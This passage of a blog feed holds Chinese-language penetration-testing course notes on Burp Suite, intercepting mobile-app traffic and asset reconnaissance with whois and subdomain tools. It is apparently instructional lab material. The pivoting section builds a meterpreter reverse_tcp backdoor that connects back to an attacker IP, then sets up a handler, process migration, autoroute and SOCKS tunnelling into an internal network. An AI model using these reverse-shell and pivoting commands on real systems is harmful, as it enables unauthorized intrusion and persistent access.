data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627637478195-678743a6-024e-40ef-967b-4f384709453d.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627637480940-79004860-7cd5-45b3-9cbd-e61b97493634.png" alt="img"></p><h4 id="manual-load-手动加载"><a class="markdownIt-Anchor" href="#manual-load-手动加载">#</a> Manual load 手动加载：</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627637508314-0b722457-5a99-475e-a878-508f8f68feeb.png" alt="img"></p><h3 id="解码器decoder"><a class="markdownIt-Anchor" href="#解码器decoder">#</a> 解码器 (Decoder)：</h3><p>解码器是一个进行手动执行或对应用程序数据者智能解码编码的工具。此功能可用于解码数据找回原来的数据形式，或者进行编码和数据加密；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798152915-280d1a98-7e89-41ee-b6df-e05fdc876ed1.png" alt="img"></p><h3 id="对比comparper"><a class="markdownIt-Anchor" href="#对比comparper">#</a> 对比 (Comparper)：</h3><p>通常是通过一些相关的请求和响应得到两项数据的一个可视化 “差异”。此功能主要用于执行任意两个请求，响应或任何其他形式的数据之间的比较；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798189229-f01ba4e4-b1be-495b-afe2-1e58f62f7475.png" alt="img"></p><h3 id="扩展extender"><a class="markdownIt-Anchor" href="#扩展extender">#</a> 扩展 (Extender)：</h3><p>可以让你加载 Burp Suit 的扩展，使用你自己的或第三方代码来扩展 Burp Suit 的功能；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798202220-d6a3806f-8acd-437e-a9cc-07c42152aa36.png" alt="img"></p><h3 id="全局参数设置project-options"><a class="markdownIt-Anchor" href="#全局参数设置project-options">#</a> 全局参数设置 (project options)：</h3><p>在 Burp Suite 中，存在一些粗粒度的设置，这些设置选项，一旦设置了将会对 Burp Suite 的整 体产生效果，这就是 Options 面板。当我们打开 Options 面板即可看到，它是由 Connections、HTTP、SSL、Sessions、Display、Misc 六个选项卡组成；</p><ul><li><ul><li>Burp 网络连接设置（Connections）</li><li>HTTP 应答消息处理设置（HTTP）</li></ul></li><li><ul><li>SSL 连接和加密设置（SSL）</li><li>会话设置（Sessions）</li></ul></li><li><ul><li>显示设置（Display）</li><li>其它工具设置（Misc）</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798210645-07730b25-b57d-448c-89e9-179720e98e9b.png" alt="img"></p><h4 id="burp-网络连接设置connections"><a class="markdownIt-Anchor" href="#burp-网络连接设置connections">#</a> Burp 网络连接设置 (Connections) ：</h4><p>Connections 选项卡主要用来控制 Burp 如何来处理平台认证、上游代理服务器、Socks 代理、 超时设置、主机名或域名解析以及 Scope 之外的请求六个方面的相关配置；</p><p><strong>1，平台认证：</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798232185-1ccab693-e063-4b48-9e9d-f8917d1dfb19.png" alt="img"></p><p>这些设置允许你配置 Burp 自动执行到目标 Web 服务器的平台身份验证，不同的主机可以 配置不同的认证方式和证书。目前支持的身份验证类型有：BASIC，NTLMv1，NTLMv2 和 “摘要” 式认证 ( Digest authentication)；</p><p>其中域名 和主机名字段只用于 NTLMv1，NTLMv2 身份验证。 在平台身份认证（Platform Authentication）设置的最下方有一个 Checkbox 选项（Prompt for credentials on platform authentication failure），如果此项选中，则表示当遇到身份验证失败时，Burp 会显示一 个交互式的弹窗，提示验证失败的信息；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798268014-d67e1afc-8711-4baa-8dab-7ebb1f9943c0.png" alt="img"></p><p><strong>2，上游代理服务器（Upstream Proxy Servers）：</strong></p><p>我们可以配置多个匹配规则。当我们配置了多个规则时，可以针对不同的目标主机或主机组指定不同的 代理服务器设置。这些规则将按照顺序，并将与目标 Web 服务器相匹配的第一个规则作 为生效规则。如果列表没有规则匹配，Burp 默认采取直连、非代理的方式进行连接；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798311949-3c655e2a-909b-4661-bf1a-3a9f8ae5f347.png" alt="img"></p><p><strong>3，Socks 代理：</strong></p><p>这些设置允许我们配置 Burp 使用 SOCKS 代理的方式进行所有传出的通信，但此设置只在 TCP 层生效，所有出站请求将通过这个代理发送。如果我们同时设置了已游 HTTP 代理服 务器配置的规则，则请求上游代理将通过这里配置的 SOCKS 代理发送。其请求的匹配路 径依次是：本地–&gt; 上游代理–&gt;SOCKS 代理。 在使用 SOCKS 代理时，我们需要勾选 【Use SOCKS proxy】，并提供代理的 ip 或者主机名、端口、认证的用户名和口令（如 上图所示）。 如果我们勾选了【Do DNS lookups over SOCKS proxy】，则进行域名解 析时，将通过 SOCKS 代理去查询，而不会使用本地缓存；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798324223-734d3304-7816-4f89-820c-7e47479d20e0.png" alt="img"></p><p><strong>4，超时设置：</strong></p><p>这些设置主要用于指定 Burp 各种网络任务的超时；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627637997110-39b3611a-b842-4881-a63e-dd0ccb5c87ed.png" alt="img"></p><p><strong>5，主机名解析：</strong></p><p>此项配置比较简单，通过这些设置，我们可以指定主机名映射到 IP 地址，来覆盖本地计算机 提供的 DNS 解析。每个主机名解析规则需要指定主机名，并与主机名相关联的 IP 地址。同时，每一个规则可以单独启用或禁用来控制其是否生效；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627638043514-59116523-c4aa-445f-8925-512fbb369cc4.png" alt="img"></p><h3 id="用户的设置user-options"><a class="markdownIt-Anchor" href="#用户的设置user-options">#</a> 用户的设置 (user options)</h3><p>这页的 connections 和前面的全局设置一样，就不再详细写了；</p><p>Ps：一般我们没有特殊需求的话，上游代理和 socks 代理都可以在这个页面设置；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798356274-aa98fade-9d70-43bf-a250-b9b6e834c464.png" alt="img"></p><h4 id="display"><a class="markdownIt-Anchor" href="#display">#</a> display：</h4><p>有时候我们的页面显示会有 bug (字体重叠，光标定位不准确)，遇到这种情况，一般在这个页面设置字体大小，字体就可以修复了；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798369928-71d5ce15-bf68-4a0a-bc65-7535c6b0296e.png" alt="img"></p><h1 id="抓app包"><a class="markdownIt-Anchor" href="#抓app包">#</a> 抓 APP 包</h1><h4 id="burp设置"><a class="markdownIt-Anchor" href="#burp设置">#</a> burp 设置</h4><p>添加一个自己本机 ip 的代理监听器</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627796789032-5f954583-4b6a-4ba3-b5d5-3f5bc746f4c9.png" alt="img"></p><h4 id="模拟器设置"><a class="markdownIt-Anchor" href="#模拟器设置">#</a> 模拟器设置</h4><p>模拟器内设置修改 wifi 的网络代理设置，设置 ip 为 burp 内设置的 ip，端口为设置的端口</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627796906821-3648da62-6e17-48c4-9d77-7d0c4152f8f4.png" alt="img"></p><p>浏览器访问 http://burp，下载 CA 证书，方便抓 https 的包</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627796990780-6838f701-78ff-4646-94c5-ee3b5e3d591f.png" alt="img"></p><p>找到下载的证书位置，修改尾缀为 cer</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797546176-748c397c-e542-4dcf-b6e3-8bd24504f669.png" alt="img"></p><p>在设置–安全–从 SD 卡安装，安装证书</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797599053-2dd290e1-3b95-4e95-a9d9-1f10dba53c2d.png" alt="img"></p><p>burp 开启抓包尝试抓包</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797686636-d2954af2-163a-4a22-9da5-86d171306884.png" alt="img"></p><h1 id="bp设置socks5代理访问内网"><a class="markdownIt-Anchor" href="#bp设置socks5代理访问内网">#</a> BP 设置 socks5 代理访问内网</h1><h3 id="环境"><a class="markdownIt-Anchor" href="#环境">#</a> 环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本机攻击者   192.168.6.126</span><br><span class="line"></span><br><span class="line">windows10   192.168.6.221      10.10.10.128    受害者  双网卡</span><br><span class="line"></span><br><span class="line">windows2012   10.10.10.129      目标</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当前以拿到windows10的主机权限，要访问2012</span><br></pre></td></tr></table></figure><h3 id="配置使用"><a class="markdownIt-Anchor" href="#配置使用">#</a> 配置使用</h3><p>在 windows10 上运行 ew，开启 socks5 服务，bp 通过配置 socks5 代理访问 windows2012；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 1080</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637720544345-4d8679b3-cda8-4ac9-b332-f5ca64ffca8b.png" alt="img"></p><p>访问 10 段的 80 端口：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637720901621-3e7c4bf7-6aa9-4bec-927a-362ec089c5c6.png" alt="img"></p><h1 id="bp设置上游代理访问内网"><a class="markdownIt-Anchor" href="#bp设置上游代理访问内网">#</a> bp 设置上游代理访问内网</h1><h3 id="环境-2"><a class="markdownIt-Anchor" href="#环境-2">#</a> 环境</h3><p>在实际环境中，使用 msf 设置代理跨网段访问时，用的是 socks4a 模块，现在的最新版本的 msf 这个工具已经把 socks4a 模块集合到 socks 模块里面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">代理通信流程：</span><br><span class="line"></span><br><span class="line">    127.0.0.1:8080 --&gt; localhost:25378 --&gt; 192.168.6.128:1080  --&gt; 10.10.10.129:80  </span><br><span class="line">攻击机kali：192.168.6.38</span><br><span class="line"></span><br><span class="line">攻击机：192.168.6.126</span><br><span class="line"></span><br><span class="line">跳板机：192.168.6.221   10.10.10.128  双网卡</span><br><span class="line"></span><br><span class="line">目标机：10.10.10.129</span><br></pre></td></tr></table></figure><h3 id="配置使用-2"><a class="markdownIt-Anchor" href="#配置使用-2">#</a> 配置使用</h3><p>msf 生成后门，反连上线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.6.38 lport=4455 -f</span><br><span class="line">exe &gt;r.exe</span><br></pre></td></tr></table></figure><p>传到跳板机，并运行，kali 开启 msf 监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.6.38</span><br><span class="line">set lport 4455</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>得到一个 session 会话：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637729927896-bf7d8afd-54ff-4d35-bc02-c53d2f9b5cb2.png" alt="img"></p><p>先做进程迁移，防止掉线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 6920     //迁移到vm tools的进程里</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637730196067-df2c6cc1-ad88-49d3-a4ec-6582e303411b.png" alt="img"></p><p>接着，我们要在跳板机上做个代理，设置一个路由：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24    //绑定10段的</span><br><span class="line"></span><br><span class="line">run autoroute -p   //查看是不是已经绑定</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637730339046-ccb184dc-4f03-43da-9cb1-fa45ae3960ee.png" alt="img"></p><p>绑定之后，做一个 socks 代理，使用 socks_proxy 模块  ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">backgroupd</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a     //设置socks版本，有4a，有5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637730574825-a0c4c72c-6d87-4671-874c-45a3ed15b286.png" alt="img"></p><p>接着，我们在攻击机上做个代理，访问目标网站：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637731059109-be502e2b-47a5-450c-84d8-8868a7f9723b.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637731074399-095c6bb4-649e-4a57-ae01-5ceb19e4842c.png" alt="img"></p><p>我们现在虽然可以访问了，但是我们的 bp 还是抓不到包的，因为我们的浏览器是走 sock4a 这条隧道出去的，但是不会走这条隧道回来；</p><p>那么，我们就要设置一下上游代理才能做到的包的抓取，让他们进行通信：</p><p>使用 SocksCap64 工具，进行 sock4a 隧道的连接：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637731484326-00ba03e1-d534-4c18-b23d-4542b9a46954.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637731520004-406baca2-0e21-4a39-b293-12a155c8b36b.png" alt="img"></p><p>这时打开程序面板内的浏览器，访问目标机，也是可以访问的到的：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637731654714-c9a1cd25-08bc-4af2-b781-7ea6f8b3c106.png" alt="img"></p><p>接着抓包，是可以抓到的，</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637731705499-98488382-245f-43ac-822f-74fa062716d6.png" alt="img"></p><p>右下角任务栏，系统代理 --&gt;  启用系统代理；</p><p>设置 bp 的顶级代理服务器 (sockscap 的系统代理端口：25378)：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637732905946-d0638350-8f60-485e-a614-bbe65355f9bb.png" alt="img"></p><p>抓包测试：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1637736142205-a25b1a29-6f27-4319-8544-316e4a65da92.png" alt="img"></p><iframe style="width: 1px; height: 1px; position: absolute; left: -100px; bottom: -100px; display: none;" src="https://tracert.alipay.com/cross.html"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第三天burpsuite使用&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第三天burpsuite使用&quot;&gt;#&lt;/a&gt; 第三天：BurpSuite 使用&lt;/h1&gt;
&lt;h1 id=&quot;img&quot;&gt;&lt;a class=&quot;markdownIt-An</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86/"/>
    <id>https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86/</id>
    <published>2022-03-04T01:28:00.772Z</published>
    <updated>2022-03-04T01:29:47.163Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二天资产信息收集"><a class="markdownIt-Anchor" href="#第二天资产信息收集">#</a> 第二天：资产信息收集</h1><h2 id="img"><a class="markdownIt-Anchor" href="#img">#</a> <img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627292293167-5c4f90cd-7fe0-4569-8171-6a1c302009ac.png" alt="img"></h2><h1 id="信息收集简介"><a class="markdownIt-Anchor" href="#信息收集简介">#</a> 信息收集简介</h1><p>信息搜集也称踩点，信息搜集毋庸置疑就是尽可能的搜集目标的信息，包括端口信息、DNS 信息、员工邮箱等等看似并不起眼的一些信息都算是信息搜集，这些看似微乎其微的信息，对于渗透测试而言就关乎到成功与否了。</p><p>信息搜集的重要性：</p><p>信息搜集是渗透测试的最重要的阶段，占据整个渗透测试的 60%，可见信息搜集的重要性。根据收集的有用信息，可以大大提高我们渗透测试的成功率。</p><h1 id="信息搜集的分类"><a class="markdownIt-Anchor" href="#信息搜集的分类">#</a> 信息搜集的分类</h1><p>1、主动式信息搜集（可获取到的信息较多，但易被目标发现）</p><p>2、通过直接发起与被测目标网络之间的互动来获取相关信息，如通过 Nmap 扫描目标系统。</p><p>3、被动式信息搜集（搜集到的信息较少，但不易被发现）</p><p>4、通过第三方服务来获取目标网络相关信息。如通过搜索引擎方式来搜集信息。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625734748286-f51f6eca-bc13-494c-a361-7f78131b717d.png" alt="img"></p><h1 id="什么是资产"><a class="markdownIt-Anchor" href="#什么是资产">#</a> 什么是资产？</h1><p>资产是指由企业过去的交易或事项形成的、由企业拥有或者控制的、预期会给企业带来经济利益的资源，而渗透测试中的资产指的则是网站的架构、ip、设备型号 (如果有的话)、网络拓扑 (多用于内网) 等等。</p><p>为什么需要资产收集？</p><p>在实际渗透测试的过程中，我们需要对企业的资产进行梳理，但是往往在渗透测试过程中，客户通常会给我们一个主域名，此时资产收集就显得尤为重要了。</p><p>随着企业内部业务的不断壮大，各种业务平台和管理系统越来越多，很多单位往往存在着 “隐形资产”，这些 “隐形资产” 通常被管理员所遗忘，长时间无人维护，导致存在较多的已知漏洞。</p><h1 id="资产收集的重要性"><a class="markdownIt-Anchor" href="#资产收集的重要性">#</a> 资产收集的重要性</h1><p>在渗透测试中，我们需要尽可能多的去收集目标的信息。资产探测和信息收集，决定了你发现安全漏洞的几率有多大。如何最大化的去收集目标范围，尽可能的收集到子域名及相关域名的信息，这对我们进一步的渗透测试很重要。</p><p>所谓资产收集就是从主域名出发，尽可能去收集关于该主域名的一切信息，如子域名、相关域名（旁站、C 端）、移动端、行业系统…</p><h1 id="域名"><a class="markdownIt-Anchor" href="#域名">#</a> 域名</h1><h2 id="备案信息"><a class="markdownIt-Anchor" href="#备案信息">#</a> 备案信息</h2><p>通过查询备案信息，我们可以获取到该企业的一些基本信息：网站地址，网站域名等；</p><h3 id="工信部网站备案查询"><a class="markdownIt-Anchor" href="#工信部网站备案查询">#</a> 工信部网站备案查询</h3><p>网站：<span class="exturl" data-url="aHR0cHM6Ly9iZWlhbi5taWl0Lmdvdi5jbi8jL0ludGVncmF0ZWQvaW5kZXg=">https://beian.miit.gov.cn/#/Integrated/index</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296122689-9c498d95-ba74-4430-8a92-3ac83da0dbdd.png" alt="img"></p><p>通常情况下可以在网站的最底部，或者在 F12 内查看一个网站的备案号，查询备案号的方式有两种：</p><ul><li><ul><li>通过页面显示的备案号直接进行查询：</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296216035-c2fb33e8-04e4-41a8-8ea8-39fb1ddc11b1.png" alt="img"></p><ul><li><ul><li>通过公司名称进行查询：</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296273672-60650d2c-9591-4686-a55c-02a9b254bd57.png" alt="img"></p><h3 id="天眼查网站备案查询"><a class="markdownIt-Anchor" href="#天眼查网站备案查询">#</a> 天眼查网站备案查询</h3><p>网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cudGlhbnlhbmNoYS5jb20v">https://www.tianyancha.com/</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296467941-e0cbccd4-c6fb-4a95-96d7-29926efa9591.png" alt="img"></p><p>在知识产权 — 域名备案下查询：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296591277-00839663-6b10-413f-957a-5de115d87469.png" alt="img"></p><h3 id="国家企业信用信息公示系统"><a class="markdownIt-Anchor" href="#国家企业信用信息公示系统">#</a> 国家企业信用信息公示系统</h3><p>网站：<span class="exturl" data-url="aHR0cDovL3d3dy5nc3h0Lmdvdi5jbi9pbmRleC5odG1s">http://www.gsxt.gov.cn/index.html</span></p><h3 id="img域名助手备案信息查询"><a class="markdownIt-Anchor" href="#img域名助手备案信息查询">#</a> <img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296725724-7084d9f0-a13a-411f-a667-a61607bb1cb9.png" alt="img"> 域名助手备案信息查询</h3><p>地址：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628045242894-7cd773d6-1c39-461c-a089-801789bba719.png" alt="img"></p><p>PS：国外的服务器一般来说是查不到的，因为他们不需要备案。国内的基本上都可以查到。</p><h2 id="whois"><a class="markdownIt-Anchor" href="#whois">#</a> whois</h2><p><span class="exturl" data-url="aHR0cDovL3huLS13aG8tb2s2ZXo5Z3RzMWUuaXM=">国外的 who.is</span>：<span class="exturl" data-url="aHR0cHM6Ly93aG8uaXMv">https://who.is/</span></p><p>站长之家：<span class="exturl" data-url="aHR0cDovL3dob2lzLmNoaW5hei5jb20v">http://whois.chinaz.com/</span></p><p>爱站：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5haXpoYW4uY29tLw==">https://whois.aizhan.com/</span></p><p>微步：<span class="exturl" data-url="aHR0cHM6Ly94LnRocmVhdGJvb2suY24v">https://x.threatbook.cn/</span></p><p>腾讯云：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5jbG91ZC50ZW5jZW50LmNvbS8=">https://whois.cloud.tencent.com/</span></p><p>美橙互联：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5jbmRucy5jb20v">https://whois.cndns.com/</span></p><p>爱名网：<span class="exturl" data-url="aHR0cHM6Ly93d3cuMjIuY24vZG9tYWluLw==">https://www.22.cn/domain/</span></p><p>易名网：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5lbmFtZS5uZXQv">https://whois.ename.net/</span></p><p>中国万网：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy5hbGl5dW4uY29tLw==">https://whois.aliyun.com/</span></p><p>西部数码：<span class="exturl" data-url="aHR0cHM6Ly93aG9pcy53ZXN0LmNuLw==">https://whois.west.cn/</span></p><p>新网域名：<span class="exturl" data-url="aHR0cDovL3dob2lzLnhpbm5ldC5jb20vZG9tYWluL3dob2lzL2luZGV4LmpzcA==">http://whois.xinnet.com/domain/whois/index.jsp</span></p><p>纳网域名：<span class="exturl" data-url="aHR0cDovL3dob2lzLm5hd2FuZy5jbi8=">http://whois.nawang.cn/</span></p><p>中资源域名：<span class="exturl" data-url="aHR0cHM6Ly93d3cuenp5LmNuL2RvbWFpbi93aG9pcy5odG1s">https://www.zzy.cn/domain/whois.html</span></p><p>三五互联域名：<span class="exturl" data-url="aHR0cHM6Ly9jcC4zNS5jb20vY2hpbmVzZS93aG9pcy5waHA=">https://cp.35.com/chinese/whois.php</span></p><p>新网互联域名：<span class="exturl" data-url="aHR0cDovL3d3dy5kbnMuY29tLmNuL3Nob3cvZG9tYWluL3dob2lzL2luZGV4LmRv">http://www.dns.com.cn/show/domain/whois/index.do</span></p><p>通过 whois 查询我们可以查询到注册商、注册人、邮件、DNS 解析服务器、注册人联系电话等信息；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627296992960-be09dbbb-94f2-434b-899a-fa52d7e423d0.png" alt="img"></p><p>同样也可进行 whois 反查，查找更多相关信息；</p><h2 id="子域名查询"><a class="markdownIt-Anchor" href="#子域名查询">#</a> 子域名查询</h2><h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h3><p>什么是子域名？为什么收集子域名？</p><p>域名分为根域名和子域名：</p><p><span class="exturl" data-url="aHR0cDovL2JhaWR1LmNvbQ==">baidu.com</span> 根域名顶级域名</p><p>www.baidu.com 子域名也叫二级域名</p><p><span class="exturl" data-url="aHR0cDovL3d3dy53aWtpLmJhaWR1LmNvbQ==">www.wiki.baidu.com</span>  子域名也叫三级域名四级如此类推</p><p>假设目标资产数量庞大，一般来说主域都是防护重点，管理上可能会谨慎，防护也相对严格，因此从子域名入手便成了很好的选择，子域往往在防护上会相对更加的松懈，然后再慢慢向目标系统渗透，所以子域名的收集便显得尤为的重要；</p><p>通常，一台服务器上有很多个站点，这些站点之间没有必然的联系，是相互独立的，使用的是不同的域名（甚至端口都不同），但是它们却共存在一台服务器上</p><h3 id="工具枚举爬虫"><a class="markdownIt-Anchor" href="#工具枚举爬虫">#</a> 工具枚举 &amp; 爬虫</h3><ul><li><ul><li>layer 子域名挖掘机</li><li>OneForAll</li></ul></li><li><ul><li>subDomainsBrute</li></ul></li></ul><h4 id="layer子域名挖掘机"><a class="markdownIt-Anchor" href="#layer子域名挖掘机">#</a> layer 子域名挖掘机</h4><p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V1cGhyYXQxY2EvTGF5ZXJEb21haW5GaW5kZXI=">https://github.com/euphrat1ca/LayerDomainFinder</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627301186393-3d9134eb-063a-4594-8e3b-7fb9a2694c37.png" alt="img"></p><h4 id="oneforall"><a class="markdownIt-Anchor" href="#oneforall">#</a> OneForAll</h4><p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=">https://github.com/shmilylty/OneForAll</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627301513430-8efaec9e-d294-4807-95e1-6e3cf50b65e6.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--alive=True</span><br><span class="line">可选值True，False分别表示导出存活，全部子域结果</span><br><span class="line">--dns=DNS</span><br><span class="line">        DNS解析子域(默认True)</span><br><span class="line">--req=REQ</span><br><span class="line">        HTTP请求子域(默认True)</span><br><span class="line">--port=PORT</span><br><span class="line">        请求验证子域的端口范围(默认只探测80端口)</span><br><span class="line">--fmt=FMT</span><br><span class="line">        结果保存格式(默认csv)</span><br><span class="line">--path=PATH</span><br><span class="line">        结果保存路径(默认None)</span><br><span class="line">--takeover=TAKEOVER</span><br><span class="line">        检查子域接管(默认False)</span><br></pre></td></tr></table></figure><h4 id="subdomainsbrute"><a class="markdownIt-Anchor" href="#subdomainsbrute">#</a> subDomainsBrute</h4><p>下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==">https://github.com/lijiejie/subDomainsBrute</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627302086622-01096d1f-17f0-4cfb-8c96-80911462ef2c.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//参数介绍：</span><br><span class="line"></span><br><span class="line">--version //显示程序的版本号并退出</span><br><span class="line"></span><br><span class="line">-h, --help //显示此帮助信息并退出</span><br><span class="line"></span><br><span class="line">-f FILE   //文件包含新行分隔的子文件，默认为子域名称.txt。</span><br><span class="line"></span><br><span class="line">--full //全扫描，将使用NAMES FILE subnames_full.txt 野蛮</span><br><span class="line"></span><br><span class="line">-i, --ignore-intranet     //忽略指向私有 IP 的域</span><br><span class="line"></span><br><span class="line">-w, --wildcard //通配符测试失败后强制扫描</span><br><span class="line"></span><br><span class="line">-t 线程，--threads=线程</span><br><span class="line">//扫描线程数，默认256</span><br><span class="line">      </span><br><span class="line">-p 进程, --process=进程</span><br><span class="line">//扫描进程数，默认为6</span><br><span class="line">      </span><br><span class="line">-o 输出, --output=OUTPUT</span><br><span 